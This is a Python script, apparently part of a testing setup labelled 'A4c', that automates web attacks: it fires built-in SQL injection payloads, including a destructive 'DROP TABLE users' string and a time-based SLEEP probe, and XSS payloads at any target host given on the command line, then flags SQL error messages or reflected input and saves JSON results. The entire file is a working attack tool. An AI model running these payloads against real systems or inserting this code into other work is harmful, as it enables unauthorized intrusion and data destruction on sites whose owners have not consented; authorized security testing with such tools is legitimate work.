#!/usr/bin/env python3
"""Web Application Attack Automation (A4c — SQLi/XSS/Protocol)."""
import argparse, time, json, os, urllib.parse
from datetime import datetime

SQLI_PAYLOADS = {
    'union_select': "' UNION SELECT NULL,NULL,NULL--",
    'or_1_equals_1': "' OR '1'='1",
    'comment_bypass': "' OR 1=1--",
    'stacked_queries': "'; DROP TABLE users--",
    'sleep_injection': "' OR SLEEP(5)--",
}
XSS_PAYLOADS = {
    'script_tag': '<script>alert("XSS")</script>',
    'img_onerror': '<img src=x onerror=alert(1)>',
    'svg_onload': '<svg onload=alert(1)>',
    'cookie_steal': '"><script>alert(document.cookie)</script>',
}

class WebAttacker:
    def __init__(self, target, port=80):
        self.target = target
        self.base_url = f"http://{target}" if port == 80 else f"http://{target}:{port}"
    def sql_injection(self, endpoint="/", duration=60):
        url = f"{self.base_url}{endpoint}"
        results = {'type': 'sqli', 'target': self.target, 'endpoint': endpoint, 'payloads_tested': [], 'vulnerable': [], 'timestamp': datetime.now().isoformat()}
        try:
            import requests
            for name, payload in SQLI_PAYLOADS.items():
                try:
                    r = requests.get(url, params={'id': payload}, timeout=5)
                    indicators = ['sql syntax', 'mysql_fetch', 'unclosed quotation', 'syntax error']
                    is_vuln = any(ind in r.text.lower() for ind in indicators)
                    results['payloads_tested'].append({'name': name, 'reflected': is_vuln, 'status_code': r.status_code})
                    if is_vuln: results['vulnerable'].append(name)
                except: pass
                time.sleep(0.5)
        except ImportError: pass
        results['total_vulnerable'] = len(results['vulnerable'])
        return results
    def xss(self, endpoint="/", duration=60):
        url = f"{self.base_url}{endpoint}"
        results = {'type': 'xss', 'target': self.target, 'endpoint': endpoint, 'payloads_tested': [], 'reflected': [], 'timestamp': datetime.now().isoformat()}
        try:
            import requests
            for name, payload in XSS_PAYLOADS.items():
                try:
                    r = requests.get(f"{url}?q={urllib.parse.quote(payload)}", timeout=5)
                    is_reflected = payload in r.text
                    results['payloads_tested'].append({'name': name, 'reflected': is_reflected})
                    if is_reflected: results['reflected'].append(name)
                except: pass
        except ImportError: pass
        results['total_reflected'] = len(results['reflected'])
        return results
    def run_all(self, endpoint="/", duration=60):
        return {'sqli': self.sql_injection(endpoint, duration), 'xss': self.xss(endpoint, duration)}

def main():
    p = argparse.ArgumentParser(description="Web Attack (A4c)")
    p.add_argument("--target", required=True); p.add_argument("--type", choices=['sqli', 'xss', 'all'], default='all')
    p.add_argument("--endpoint", default="/"); p.add_argument("--duration", type=int, default=60)
    p.add_argument("--output-dir", default="data/results")
    args = p.parse_args()
    attacker = WebAttacker(args.target)
    if args.type == 'sqli': results = attacker.sql_injection(args.endpoint, args.duration)
    elif args.type == 'xss': results = attacker.xss(args.endpoint, args.duration)
    else: results = attacker.run_all(args.endpoint, args.duration)
    os.makedirs(args.output_dir, exist_ok=True)
    with open(f"{args.output_dir}/web_attack_{args.type}_{int(time.time())}.json", 'w') as f: json.dump(results, f, indent=2)
    print(f"[WEB ATTACK] Completed.")

if __name__ == "__main__": main()
